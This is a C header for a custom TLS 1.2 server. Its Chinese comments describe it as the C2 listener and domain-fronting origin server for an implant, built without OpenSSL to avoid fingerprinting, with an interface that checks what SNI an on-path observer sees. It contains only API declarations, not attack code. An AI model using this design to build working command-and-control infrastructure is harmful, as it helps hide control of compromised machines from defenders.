/* tls_server.h — 自研 TLS 1.2 服务端
 *
 * 为什么必须有服务端：
 *   1. 域前置链路的终点是我们自己的回源服务器。没有服务端，"前置"这条链
 *      永远只能验证到客户端一侧，回源之后发生什么无人把关。
 *   2. 直连 C2 需要一个不依赖 OpenSSL 的监听端。植入体侧已经零第三方依赖，
 *      监听端若引入 OpenSSL，整条链的"无第三方指纹"就断在最后一环。
 *   3. 只有两端都是自己的实现，才能在本机做闭环互操作验证，不必依赖外网。
 *
 * 与客户端对称：同样的唯一套件 TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256，
 * 同样的 X25519 + RSA-PKCS1v15-SHA256 + AES-128-GCM。IO 同样走回调，
 * 因此服务端可以挂在 socket、管道、内存隧道上，测试不需要真网络。
 *
 * 硬规则：
 *   - 客户端没提供我们唯一支持的套件/曲线/签名算法，一律显式报错，
 *     绝不"挑一个最接近的"。挑近似值会让握手在某一步莫名失败，
 *     而失败点与真正的原因相隔很远。
 *   - 主密钥派生的 X25519 共享值为全零时拒绝。低阶点攻击会让 pms 恒为 0，
 *     密钥随之可预测；不检查的话握手照样成功，只是密钥谁都能算出来。
 */
#ifndef TLS_SERVER_H
#define TLS_SERVER_H

#include "tls.h"
#include "x509.h"
#include "rsa.h"

typedef struct tls_server_ctx tls_server_ctx;

typedef struct {
    const uint8_t *chain[X509_CHAIN_MAX];   /* DER 证书，[0] 必须是叶子 */
    size_t         chain_len[X509_CHAIN_MAX];
    int            chain_n;
    const rsa_privkey *key;                 /* 叶子证书对应的私钥（签 SKE） */
    const char    *alpn;                    /* 服务端接受的 ALPN；NULL = 不协商 */
} tls_server_config;

tls_err tls_server_init(tls_server_ctx **out, const tls_server_config *cfg,
                        tls_send_cb send, tls_recv_cb recv, void *arg);
void    tls_server_free(tls_server_ctx *c);

/* 完成一次握手（阻塞，直到成功或失败） */
tls_err tls_server_accept(tls_server_ctx *c);

tls_err tls_server_read(tls_server_ctx *c, uint8_t *buf, size_t cap, size_t *out_len);
tls_err tls_server_write(tls_server_ctx *c, const uint8_t *data, size_t len);

/* 发送 close_notify 并关闭本端写方向（与客户端 tls_close 对称）。
 *
 * 不发的后果在真机上很具体：OpenSSL 3.0.2 的 s_client 会报
 * "unexpected eof while reading" 并以非零码退出——握手、验链、应用数据
 * 全对，但对端仍把这次会话判为异常结束。幂等。 */
tls_err tls_server_close(tls_server_ctx *c);

/* 最近一次收到的告警记录内容（level, description）。
 *
 * 为什么必须暴露字节而不只返回 TLS_ERR_ALERT：
 *   close_notify 是 (warning=1, close_notify=0)，致命告警是 (fatal=2, *)。
 *   两者在 tls_server_read 上都返回 TLS_ERR_ALERT，只看返回码无法区分。
 *   而对端的语义完全不同：close_notify 是"我正常收尾了"，致命告警是
 *   "我出错了/我拒绝你"。若把两者混为一谈，C2 侧会把植入体的报错退出
 *   记成正常批量结束——正是要消除的那种歧义。
 * 未收到过任何告警时 *level = *desc = 0。 */
void tls_server_last_alert(const tls_server_ctx *c, uint8_t *level, uint8_t *desc);

/* ---- 取证接口 ----
 * SNI 是握手中唯一以明文出现的主机名。域前置的全部意义就在于：
 * 链路上看得到的是前置域，真实目标只在加密内层。要断言这一点，
 * 必须有一个"站在链路上"的观察者能报出它实际读到的 SNI ——
 * 这个接口就是那个观察者。 */
int tls_server_sni(const tls_server_ctx *c, char *out, size_t cap);

/* 协商出的 ALPN（空串 = 未协商） */
int tls_server_alpn(const tls_server_ctx *c, char *out, size_t cap);

/* 自测：签名 -> 验签 往返（不需要网络，用于确认私钥解析正确） */
tls_err tls_server_selftest_key(const rsa_privkey *k);

#endif /* TLS_SERVER_H */
